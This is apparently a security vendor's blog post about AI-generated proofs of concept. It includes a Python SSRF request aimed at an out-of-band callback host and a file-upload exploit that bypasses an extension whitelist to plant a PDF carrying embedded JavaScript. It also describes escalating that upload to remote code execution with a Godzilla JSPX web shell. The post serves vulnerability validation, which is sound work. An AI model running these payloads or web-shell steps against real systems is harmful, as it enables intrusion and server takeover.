---
title: "Vulnerability Assessments Without PoC Are a Waste of Time!"
description: "Discover why vulnerability assessments without a Proof of Concept (PoC) are a waste of time. This article explores how AI and LLMs can automatically generate effective PoCs for vulnerabilities like SSRF and Path Injection, enabling teams to validate real risks quickly and eliminate false positives."
author: "Zast.ai Team"
date: 2025-09-19
categories: [Security, AI, Tech Insights]
tags: [Vulnerability Assessment, Proof of Concept, Zast.ai, AI in Cybersecurity, LLM, SSRF, Path Injection, RCE, File Upload Vulnerability, Automated Security Testing, Application Security, Vulnerability Validation, False Positives]
hidden: false
---

**Zast.ai Team**,  
Zast.ai  
Sep. 19, 2025, Seattle

---




Security challenges exist in today’s digital world. Software has high complexity, companies release updates in a timely manner, and threat actors continue to enhance their capabilities. The number of skilled specialists is limited, and many users lack an understanding of the importance of security.

POCs change the game here—users gain a clear understanding of a vulnerability’s risks and settle disputes, and teams avoid unnecessary effort on extensive false positives. This helps people clarify vulnerability issues before fully committing to fixes.

## **Validating a Vulnerability: A Complicated and Time-Consuming Process**

Without a POC, it’s hard to agree on a vulnerability's severity or even if it’s a vulnerability at all. Many vulnerabilities remain unclear and controversial, and the constant "crying wolf" scenarios make it hard for people to trust the actual risks.

- Consider [CVE-2020-19909](https://daniel.haxx.se/blog/2023/08/26/cve-2020-19909-is-everything-that-is-wrong-with-cves/){:target="_blank"}. Initially rated severe with a score of 9.8, it was later lowered to 3.3 after disputes, classifying it as low risk. Stenberg, founder of "curl," called it "wrong with CVEs," noting it's a bug but not a true vulnerability.
- Another example is [CVE-2024-4067](https://github.com/advisories/GHSA-952p-6rrq-rcjv){:target="_blank"}, targeting the micromatch library in the npm project, considered a “high severity” ReDoS vulnerability. Developer Jon Schlinkert asked, “Can you point to a real application of micromatch affected by this vulnerability?” "He expressed frustration that these are more theoretical risks than actual vulnerabilities.

Creating an accurate and complete POC for each vulnerability is time-consuming and costly. Moreover, in an industry lacking a solid business cycle, many products are rushed out without thorough checks. This leads to vulnerabilities slipping through, often due to ineffective POCs.

Given these challenges, only a POC can prove potential issues and help teams assess real risks, so it's not just a nice-to-have, it’s a necessity.

## **Using AI to Create Effective POCs: Our Edge in  Vulnerabilities Analysis**

Empowered by AI, zast.ai quickly creates effective POCs to assess applications efficiently. We'll show 2 reports as examples. Let's take a look.

### **I.  SSRF  Vulnerability**

<center><img src="{{'/assets/img/Vulnerability-Assessments-Without-PoC-Are-a-Waste-of-Time!/1st-report.png' | relative_url }}" alt="1st-report" width="750" height="auto"></center>

And let's see how LLM works in this sample.

First off, obtaining the Correct Parameters:

The LLM starts by pulling parameters from the source code. It gets the user-input URL by calling `String URL = request.getUrlInput()`. Then, it reads the `getUrlInput()` code to confirm  parameter's source and accurately get `urlInput`.

```java
@Generated
public String getUrlInput() {
    return this.urlInput;
}
```

Secondly, generating the Correct POC:

Using source code information, the LLM grabs key API paths and content types:

- Path: `/url/pdf`
- Content Type: `multipart/form-data`

```java
 @PostMapping(consumes = {"multipart/form-data"}, value = {"/url/pdf"})
40:     @Operation(summary = "Convert a URL to a PDF", description = "This endpoint fetches content from a URL and converts it to a PDF format. Input:N/A Output:PDF Type:SISO")
41:     public ResponseEntity<byte[]> urlToPdf(@ModelAttribute UrlToPdfRequest request) throws IOException, InterruptedException {
```

The LLM uses this info to create a valid POC. It builds an HTTP POST request with the `requests` library, including the URL parameter in the request body.

```java
import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder
url = 'http://**************.com:7001/api/v1/convert/url/pdf'
payload = MultipartEncoder(fields={'urlInput': 'http://*********.oast.me'})
headers = {'Content-Type': payload.content_type}
headers.update({'User-Agent': 'oxpecker'})
response = requests.post(url, data=payload, headers=headers, verify=False)
print('Status Code:', response.status_code)
print('Content:', response.content)
print('Text:', response.text)
```

This example shows how to use the LLM to automate identifying and validating vulnerabilities, especially with specific API requests. By breaking down the source code and parsing the parameters, the model can generate effective POCs. This showcases its real-world application in automated security testing.

### **II. Path Injection Vulnerability:**

<center><img src="{{'/assets/img/Vulnerability-Assessments-Without-PoC-Are-a-Waste-of-Time!/2nd-report.png' | relative_url }}" alt="2nd-report" width="750" height="auto"></center>

First, here’s a snippet of code that has the vulnerability:

```java
// ********************************

56:     @RequestMapping(value = {"/uploadaudio"}, method = {RequestMethod.POST})
57:     public String uploadAudio(HttpServletRequest request, HttpServletResponse response, @RequestParam(value = "uploadfile", required = true) MultipartFile uploadfile, @RequestParam(value = "param", required = false) String param, @RequestParam(value = "fileType", required = true) String fileType) {
58:         try {
59:             String[] type = fileType.split(",");
60:             setFileTypeList(type);
61:             String ext = FileUploadUtils.getSuffix(uploadfile.getOriginalFilename());
62:             if (!fileType.contains(ext)) {
63:                 return responseErrorData(response, 1, "Fail to upload due to format error.");
64:             }
65:             String filePath = getPath(request, ext, param);
66:             File file = new File(getProjectRootDirPath(request) + filePath);
67:             if (!file.getParentFile().exists()) {
68:                 file.getParentFile().mkdirs();
69:             }
```

The advanced LLM from zast.ai generated the following POC and execution result:

```python
import requests
import random
import string
url = 'http://*********************/uploadaudio'
param = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
file_content = b'%PDF-%PDF-1.3\n%\xef\xbf\xbd\xef\xbf\xbd\xef\xbf\xbd\xef\xbf\xbd\n1 0 obj\n<</Pages 2 0 R /Type /Catalog>>\nendobj\n2 0 obj\n<</Count 1 /Kids [3 0 R] /Type /Pages>>\nendobj\n3 0 obj\n<</AA\n  <</O\n  <</JS\n  (\ntry {\n  app.alert\\("XSS"\\)\n} catch \\(e\\) {\n  app.alert\\(e.message\\);\n}\n    ) \n  /S /JavaScript>>>>\n  /Annots [] /Contents 4 0 R /MediaBox [0 0 612 792] /Parent 2 0 R\n  /Resources\n  <</Font <</F1 <</BaseFont /Helvetica /Subtype /Type1 /Type /Font>>>>>>\n  /Type /Page>>\nendobj\n4 0 obj\n<</Length 21>>\nstream\n \nBT\n/F1 24 Tf\nET\n    \nendstream\nendobj\nxref\n0 5\n0000000000 65535 f\n0000000015 00000 n\n0000000062 00000 n\n0000000117 00000 n\n0000000424 00000 n\ntrailer\n\n<</Root 1 0 R /Size 5>>\nstartxref\n493\n%%EOF\n'
files = {'uploadfile': ('example.pdf', file_content, 'application/pdf')}
data = {'param': param, 'fileType': 'pdf'}
headers = {'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36', 'Accept': 'application/json, text/javascript, */*; q=0.01', 'Referer': 'http://*************/admin/main/index', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'en-US,en;q=0.9', 'X-Requested-With': 'XMLHttpRequest', 'Origin': 'http://****************:8080', 'Cookie': 'inxedulogin_sys_user_=inxedulogin_sys_user_1; JSESSIONID=79874FF26726344971B8834D3820DC71;'}
response = requests.post(url, files=files, data=data, verify=False, headers=headers)
print('Status Code:', response.status_code)
print('Response Text:', response.text)
```

<center><img src="{{'/assets/img/Vulnerability-Assessments-Without-PoC-Are-a-Waste-of-Time!/result.png' | relative_url }}" alt="result" width="750" height="auto"></center>

From the vulnerable code and the POC, we can see that the `fileType` parameter controls the file upload type. This means that the file extension whitelist allows threat actor to modify at will. In this case, Zast.ai used a PDF file with an XSS payload to demonstrate the file upload vulnerability.

Next, let’s copy the POC code to our local machine for testing:

<center><img src="{{'/assets/img/Vulnerability-Assessments-Without-PoC-Are-a-Waste-of-Time!/POC-code.png' | relative_url }}" alt="POC-code" width="750" height="auto"></center>

```python
labs :: ~ » cat poc.py

import requests
import random
import string
url = 'http://***************/uploadaudio'
param = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
file_content = b'%PDF-%PDF-1.3\n%\xef\xbf\xbd\xef\xbf\xbd\xef\xbf\xbd\xef\xbf\xbd\n1 0 obj\n<</Pages 2 0 R /Type /Catalog>>\nendobj\n2 0 obj\n<</Count 1 /Kids [3 0 R] /Type /Pages>>\nendobj\n3 0 obj\n<</AA\n  <</O\n  <</JS\n  (\ntry {\n  app.alert\\("XSS"\\)\n} catch \\(e\\) {\n  app.alert\\(e.message\\);\n}\n    ) \n  /S /JavaScript>>>>\n  /Annots [] /Contents 4 0 R /MediaBox [0 0 612 792] /Parent 2 0 R\n  /Resources\n  <</Font <</F1 <</BaseFont /Helvetica /Subtype /Type1 /Type /Font>>>>>>\n  /Type /Page>>\nendobj\n4 0 obj\n<</Length 21>>\nstream\n \nBT\n/F1 24 Tf\nET\n    \nendstream\nendobj\nxref\n0 5\n0000000000 65535 f\n0000000015 00000 n\n0000000062 00000 n\n0000000117 00000 n\n0000000424 00000 n\ntrailer\n\n<</Root 1 0 R /Size 5>>\nstartxref\n493\n%%EOF\n'
files = {'uploadfile': ('example.pdf', file_content, 'application/pdf')}
data = {'param': param, 'fileType': 'pdf'}
headers = {'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36', 'Accept': 'application/json, text/javascript, */*; q=0.01', 'Referer': 'http://***************:8080/admin/main/index', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'en-US,en;q=0.9', 'X-Requested-With': 'XMLHttpRequest', 'Origin': 'http://****************:8080', 'Cookie': 'inxedulogin_sys_user_=inxedulogin_sys_user_1; JSESSIONID=79874FF26726344971B8834D3820DC71;'}
response = requests.post(url, files=files, data=data, verify=False, headers=headers)
print('Status Code:', response.status_code)
print('Response Text:', response.text)
```

When we access the URL of the uploaded file that is returned in the HTTP response via the browser：

<center><img src="{{'/assets/img/Vulnerability-Assessments-Without-PoC-Are-a-Waste-of-Time!/url.png' | relative_url }}" alt="url" width="750" height="auto"></center>

We'll see that PDF file has been successfully uploaded and that the XSS payload was executed in Chrome.

Now, let’s try changing the `fileType` to something else to see if we can escalate the file upload vulnerability to RCE (Remote Code Execution).

First, we’ll use a tool called Godzilla to generate a malicious piece of code. We replace the corresponding part in the POC and rename the file to `example.jspx`, modifying the value of the `fileType` parameter to `jspx`.

<center><img src="{{'/assets/img/Vulnerability-Assessments-Without-PoC-Are-a-Waste-of-Time!/jspx.png' | relative_url }}" alt="jspx" width="750" height="auto"></center>

<center><img src="{{'/assets/img/Vulnerability-Assessments-Without-PoC-Are-a-Waste-of-Time!/labs.png' | relative_url }}" alt="labs" width="750" height="auto"></center>

<center><img src="{{'/assets/img/Vulnerability-Assessments-Without-PoC-Are-a-Waste-of-Time!/vim-poc.png' | relative_url }}" alt="vim-poc" width="750" height="auto"></center>

After editing the POC file, we run it again, and it shows that the JSPX file was uploaded successfully.

<center><img src="{{'/assets/img/Vulnerability-Assessments-Without-PoC-Are-a-Waste-of-Time!/python-poc.png' | relative_url }}" alt="python-poc" width="750" height="auto"></center>

Next, we use Godzilla’s client to manage this backdoor by adding the configuration we generated earlier. We’ll test if it connects properly.

<center><img src="{{'/assets/img/Vulnerability-Assessments-Without-PoC-Are-a-Waste-of-Time!/shell.png' | relative_url }}" alt="shell" width="750" height="auto"></center>

Finally, once added, we can manipulate the backdoor to control the target Web server.

<center><img src="{{'/assets/img/Vulnerability-Assessments-Without-PoC-Are-a-Waste-of-Time!/false.png' | relative_url }}" alt="false" width="750" height="auto"></center>

So, by simply tweaking the POC zast.ai provided for the file upload vulnerability, we’ve easily landed an RCE vulnerability.

The above examples show how well LLMs can automate POC generation. Traditional methods, on the other hand, have many challenges and limitations.

### **Vulnerability POC Comparison**

To better understand the advantages of using LLM for generating POCs, let's compare it to traditional methods:

1. Manual Code Review: It can create POCs, but this process takes a lot of time. Plus, the quality really depends on how skilled the security expert is, and it can get pretty pricey.
2. SAST: It doesn’t generate POCs. So, security experts waste loads of time digging through thousands of findings, only to find that 95% of them are false positives, which can be really frustrating.
3. DAST: It does provide POCs, but the coverage is usually pretty limited.
4. IAST: While it might generate POCs, coverage can fall short. Additionally, when deploying, it usually requires installing an agent, which has a certain impact on the production environment and may cause a certain degree of server performance consumption.

The feature of this method is the combination of code analysis and request creation. It enables the generation of verifiable POCs within a certain time frame, reducing the time and cost required for manual validation. This capability is not widely available in the industry; many security tools or agents still rely on manual operations, which makes the LLM used by us have certain advantages in vulnerability validation.

## Conclusion

As security issues rise, organizations need solutions. POCs are key for managing vulnerabilities as they help security teams confirm and assess their impacts. Zast.ai provides reliable POCs to help users quickly identify vulnerabilities.

Visit zasta.ai now to try it and keep your systems secure!

